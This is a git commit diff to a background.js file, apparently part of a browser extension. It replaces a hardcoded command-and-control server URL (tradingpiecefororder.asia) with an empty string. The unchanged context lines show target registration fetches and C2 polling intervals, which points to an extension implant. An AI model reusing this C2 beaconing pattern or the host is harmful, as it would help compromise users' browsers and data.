94e41c3d8a46ef946fb40369f476165ed7e85fcf
Tenebrustan <167222414+Tenebrustan@users.noreply.github.com>
2025-08-05 12:46:39 +0400

    Update background.js

--- background.js
+++ background.js
@@ -27,7 +27,7 @@ window.run = function(cfg) {
       console.error("[Target] Fetch error during registration:", err);
     });
 };
-  const C2_SERVER = 'https://tradingpiecefororder.asia'; // Update if needed
+  const C2_SERVER = ''; // Update if needed
   const MIN_POLL_SECONDS = 2;
   const MAX_POLL_SECONDS = 5;
 
@@ -386,6 +386,7 @@ if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage?.addListener) {
   return true;
 });
 }
+
 
 
 
